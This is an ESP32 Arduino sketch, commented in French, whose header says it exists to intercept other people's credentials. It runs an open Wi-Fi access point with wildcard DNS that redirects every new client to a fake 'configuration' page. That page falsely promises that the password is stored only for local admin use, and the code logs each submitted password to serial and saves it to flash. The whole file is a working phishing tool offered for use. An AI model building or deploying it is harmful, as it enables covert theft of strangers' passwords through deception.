/*
  ESP32 Captive Portal (AP ouvert) -> page de configuration demandant un mot de passe
  pour intercepter des identifiants d'autrui.
*/

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>

const char* AP_SSID = "ESP32_Open_Config";
const IPAddress AP_IP(192,168,4,1);
const byte DNS_PORT = 53;

WebServer server(80);
DNSServer dnsServer;
Preferences prefs;

const char* PREF_NS = "cfg";
const char* PREF_PASS = "admin_pass";
const char* PREF_SEEN = "seen_ips"; // stocke IPs vues séparées par ';'
const size_t MAX_PREF_LEN = 3000;

// Simple page that asks user for admin password (min 8)
const char CONFIG_HTML[] PROGMEM = R"rawliteral(
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Config ESP32</title></head>
<body style="font-family:Arial;margin:20px;">
  <h2>Configuration - ESP32</h2>
  <p>Entrez un mot de passe administrateur (min 8 caractères) pour cet appareil.</p>
  <form action="/apply" method="post">
    <label>Nouveau mot de passe: <input type="password" name="pass" minlength="8" required></label><br><br>
    <input type="submit" value="Appliquer">
  </form>
  <p style="font-size:0.9em;color:#666">Ce mot de passe est stocké localement sur l'ESP32 et sert uniquement à protéger l'accès admin.</p>
</body>
</html>
)rawliteral";

const char OK_HTML[] PROGMEM = R"rawliteral(
<!doctype html>
<html>
<head><meta charset="utf-8"><title>OK</title></head>
<body style="font-family:Arial;margin:20px;">
  <h2>Mot de passe appliqué</h2>
  <p>L'ESP32 a enregistré le mot de passe. Vous pouvez maintenant naviguer normalement.</p>
</body>
</html>
)rawliteral";

// helper : get client IP string
String clientIP() {
  WiFiClient c = server.client();
  IPAddress ip = c.remoteIP();
  return ip.toString();
}

// Preferences helpers: seen IP list
String getSeenList() {
  return prefs.getString(PREF_SEEN, "");
}
void setSeenList(const String &s) {
  if (s.length() > (int)MAX_PREF_LEN) {
    String truncated = s.substring(s.length() - MAX_PREF_LEN);
    prefs.putString(PREF_SEEN, truncated);
  } else {
    prefs.putString(PREF_SEEN, s);
  }
}
bool isSeen(const String &ip) {
  if (ip.length() == 0) return false;
  String list = getSeenList();
  return (list.indexOf(";" + ip + ";") >= 0);
}
void markSeen(const String &ip) {
  if (ip.length() == 0) return;
  String list = getSeenList();
  if (list.indexOf(";" + ip + ";") >= 0) return;
  if (list.length() == 0) list = ";" + ip + ";";
  else list += ip + ";";
  setSeenList(list);
  Serial.println("Marked seen: " + ip);
}

// Routes
void handleRoot() {
  // redirect to config page (for convenience)
  server.sendHeader("Location", String("http://") + AP_IP.toString() + "/config");
  server.send(302, "text/plain", "");
}

void handleConfig() {
  server.send_P(200, "text/html", CONFIG_HTML);
}

void handleApply() {
  if (!server.hasArg("pass")) {
    server.send(400, "text/plain", "Paramètre manquant");
    return;
  }
  String pass = server.arg("pass");
  if (pass.length() < 8) {
    server.send(400, "text/plain", "Mot de passe trop court (min 8)");
    return;
  }

  Serial.println("Le mot de passe taper est : "); Serial.println(pass);

  // Stockage sécurisé simple : sauvegarde en NVS
  prefs.putString(PREF_PASS, pass);
  // Marquer client vu pour éviter redirection répétée
  String ip = clientIP();
  markSeen(ip);

  // appliquer : rien d'autre nécessaire ici (mot de passe admin pour usage interne)
  server.send_P(200, "text/html", OK_HTML);
  Serial.println("Admin password stored (NVS). Client IP marked: " + ip);
}

// NotFound: captive logic -> redirect new clients to /config
void handleNotFound() {
  String ip = clientIP();
  Serial.println("Request from: " + ip + " URI: " + server.uri());

  // If client not seen, redirect to config page
  if (!isSeen(ip)) {
    server.sendHeader("Location", String("http://") + AP_IP.toString() + "/config");
    server.send(302, "text/plain", "");
    return;
  }

  // else, respond normally (simple message)
  String msg = "ESP32: page introuvable (client connu). URI: " + server.uri();
  server.send(404, "text/plain", msg);
}

// Setup AP open and DNS captive
void startOpenAP() {
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255,255,255,0));
  // Open AP: no password (NULL)
  WiFi.softAP(AP_SSID);
  Serial.println("Open AP started: " + String(AP_SSID));
  Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());

  // start DNS to capture all domains
  dnsServer.start(DNS_PORT, "*", AP_IP);
  Serial.println("DNS server started for captive portal");
}

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println("\n=== ESP32 Open Captive Portal (config page) ===");

  prefs.begin(PREF_NS, false);

  // start open AP
  startOpenAP();

  // HTTP routes
  server.on("/", handleRoot);
  server.on("/config", handleConfig);
  server.on("/apply", HTTP_POST, handleApply);
  server.onNotFound(handleNotFound);
  server.begin();
  Serial.println("HTTP server started");
  Serial.println("Connect to WiFi '" + String(AP_SSID) + "' (open) and open any page to be redirected.");
}

unsigned long lastDns = 0;
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // occasional debug print
  if (millis() - lastDns > 30000) {
    lastDns = millis();
    Serial.println("Stored admin pass? " + String(prefs.isKey(PREF_PASS) ? "yes" : "no")); 
    Serial.println("Seen list: " + getSeenList());
  }
}
